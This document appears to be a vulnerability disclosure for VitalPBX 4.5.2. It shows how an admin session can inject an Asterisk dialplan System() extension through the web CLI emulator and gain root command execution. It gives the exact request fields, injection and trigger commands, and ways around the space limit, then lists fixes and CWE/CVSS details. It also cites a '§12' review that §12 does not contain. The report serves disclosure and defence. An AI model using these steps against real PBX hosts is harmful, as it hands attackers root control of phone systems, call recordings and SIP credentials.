# VitalPBX 4.5.2 — Authenticated Root RCE via asterisk_cli → dialplan System() (Privilege Escalation)

## 1. Overview

VitalPBX is a closed-source on-prem IP PBX and contact-center platform built on Asterisk. The web console includes an "Asterisk CLI Emulator" feature whose dispatcher (`asterisk_cli runCommand`) forwards the `data` field to the Asterisk CLI with **no filtering or escaping**. Because `asterisk-pbx 20.20.1` runs as **root** (not dropped to an unprivileged user), a web administrator can inject a dialplan extension using the `System()` application and execute arbitrary OS commands as root — crossing the intended boundary between "PBX administrator" and "operating-system root" (CWE-269 + CWE-78).

The attack is fully remote over HTTP (`POST /index.php`) and requires only a valid VitalPBX administrator session. No default credentials, no MITM, no SIP/AMI access. Verified end-to-end with a root-owned marker (`uid=0(root)`).

## 2. Vulnerability Summary

- **Type**: Authenticated RCE / privilege escalation (web admin → OS root)
- **Root cause 1 (CWE-78)**: `asterisk_cli runCommand` passes `data` verbatim to the Asterisk CLI; the dialplan `System()` application passes its argument verbatim to `sh -c`
- **Root cause 2 (CWE-269)**: `asterisk-pbx` runs as root, so `System()` executes with uid 0
- **Root cause 3 (CWE-306/CWE-285)**: the CLI emulator allows state-changing commands (`dialplan add`, `channel originate`) with no whitelist
- **Result**: valid admin session → inject `System()` extension → trigger via originate → root RCE. CVSS 8.8.

## 3. Authentication Boundary

The web layer is nginx + php-fpm 8.2.32 (all PHP ioncube-encrypted), listening on HTTP 8060 / HTTPS 8061 / api_v2 8062-8063. Sessions use a `sid` cookie mapped to a DB `session_id` (binary(20), CSPRNG-generated, unforgeable); `csfr_token` is also CSPRNG. There is no default password — the first install forces a password change.

The intended boundary is: web administrators (www-data via php-fpm) operate Asterisk only through controlled interfaces, while the Asterisk process (root) accepts only legitimate PBX operations. This vulnerability breaks that boundary.

## 4. Attack Surface

- **Entry**: `POST /index.php`
  - `class=asterisk_cli`, `method=runCommand`, `mode=get`, `data=<CLI command string>`
  - `csfr_token=<token>`, `Cookie: sid=<admin session>`
- **Backend**: the `data` field is forwarded verbatim to the Asterisk Manager Interface `Command` action (or `asterisk -rx`)
- **No filter/whitelist/escape** on the CLI command string
- **Asterisk dialplan `System()`**: executes `sh -c "<command>"` inheriting the Asterisk process privileges (root)

## 5. Sink Identification

The sink chain has two stages:

1. **CLI sink**: `asterisk_cli runCommand` → AMI `Command` action → `asterisk -rx <data>` (arbitrary Asterisk CLI command)
2. **OS command sink**: Asterisk dialplan `System()` application → `sh -c "<arg>"` (inherits root)

The `dialplan add extension` CLI command adds an extension to the **in-memory dialplan immediately, without `dialplan reload`**, which bypasses any reload-path validation:

```
dialplan add extension 7777,1,System(id>/tmp/dp_rce_clean) into rcectx_clean
```

## 6. Source Identification & Controllability

The source is the `data` parameter of `asterisk_cli runCommand`. It is controlled byte-for-byte by the authenticated admin and forwarded to the CLI with no sanitization:

```text
POST /index.php
class=asterisk_cli
method=runCommand
mode=get
data=<CLI command string>
csfr_token=<token>
Cookie: sid=<admin session>
```

## 7. Data Flow

```
Admin session (sid + csfr_token)
  │
  ├─POST /index.php (class=asterisk_cli, method=runCommand, data="dialplan add extension 7777,1,System(id>/tmp/dp_rce_clean) into rcectx_clean")
  │
  ├─php-fpm → AMI Command (or asterisk -rx) → in-memory dialplan updated (no reload)
  │      response: "Context 'rcectx_clean' did not exist prior to add extension - the context will be created..."
  │
  ├─POST /index.php (data="channel originate Local/7777@rcectx_clean application hangup")
  │
  ├─Asterisk matches Local/7777@rcectx_clean → executes System(id>/tmp/dp_rce_clean)
  │
  └─sh -c "id>/tmp/dp_rce_clean"  (root, uid 0) → marker /tmp/dp_rce_clean
```

## 8. Exploit Construction

Step 1 — inject the `System()` extension:

```
dialplan add extension 7777,1,System(id>/tmp/dp_rce_clean) into rcectx_clean
```

The server response confirms the extension was added to a newly created context:

```json
{"state":"success","action":"puthtml","html":"Context 'rcectx_clean' did not exist prior to add extension - the context will be created. Extension '7777,1,System(id>/tmp/dp_rce_clean)' added into 'rcectx_clean' context"}
```

Step 2 — trigger execution:

```
channel originate Local/7777@rcectx_clean application hangup
```

Step 3 — verify the marker:

```
$ cat /tmp/dp_rce_clean
uid=0(root) gid=0(root) groups=0(root)
```

Constraint: the `System()` argument is parsed by `sh -c`, so the command must not contain spaces (spaces split into arguments). Space-free forms like `id>/tmp/marker` are used; complex commands can use `${IFS}` or base64 wrapping.

## 9. Dynamic Verification

Executed on a chroot-deployed VitalPBX instance over pure HTTP:

- `dialplan add` response confirmed the context was created and the extension added without reload
- `channel originate` returned `{"state":"success","action":"puthtml","html":"",...}` (async, empty html is normal)
- Marker verification:

```
# cat /tmp/dp_rce_clean
uid=0(root) gid=0(root) groups=0(root)
```

The file is root-owned and contains the root `id` output — root command execution confirmed. The exploit script is pure stdlib with English stdout; the double-subagent adversarial review (§12) is recorded in the run log.

## 10. Reachability & Impact

- **Reachability**: fully remote via HTTP; requires only a valid admin session (obtained via phishing, credential leak, or brute force). No MITM, no default credentials, no physical access, no SIP/AMI.
- **Impact**: immediate root shell on the PBX host — call recordings, SIP credentials, CDRs, and server data exposed; call routing and IVR can be tampered; the PBX (critical communications infrastructure) is fully controlled.
- **Chain value**: the primitive can escalate any low-privilege or pre-auth finding (auth bypass, SSRF) into root RCE.

The chain relies on two Asterisk behaviors that are enabled by default: the `dialplan add extension` CLI command mutates the in-memory dialplan immediately without a reload, and the `System()` application executes its argument through `/bin/sh -c` with the privileges of the Asterisk process. Both behaviors are documented Asterisk features, which is precisely why they are dangerous behind an unfiltered CLI gateway: the web layer is expected to constrain what a PBX administrator can do, but `asterisk_cli runCommand` exposes the raw CLI verbatim. The `channel originate` command is used only to trigger the injected extension; alternative triggers such as an inbound call matching the injected extension would execute the same `System()` payload, so the exploit does not depend on originate being enabled. In this deployment, the CLI gateway itself is the only interactive path to the Asterisk process, making the escalation deterministic rather than dependent on an auxiliary service.

## 11. Fix Recommendations

1. Remove or restrict `asterisk_cli runCommand`: whitelist read-only commands (`core show ...`); block state-changing commands (`dialplan add`, `channel originate`, `module load`).
2. Run `asterisk-pbx` as a non-root user (e.g., `asterisk`), so even an injected `System()` cannot obtain root directly.
3. Disable or sandbox `System()`/`TrySystem()` dialplan applications, or replace with an exec allowlist.
4. Audit-log every `runCommand` call with the full command string and caller identity.

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (CLI/dialplan injection)
- **CWE-269**: Improper Privilege Management (Asterisk runs as root; admin → root escalation)
- **CWE-285**: Improper Authorization (CLI emulator allows state-changing commands)
- **CVSS**: 8.8 — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
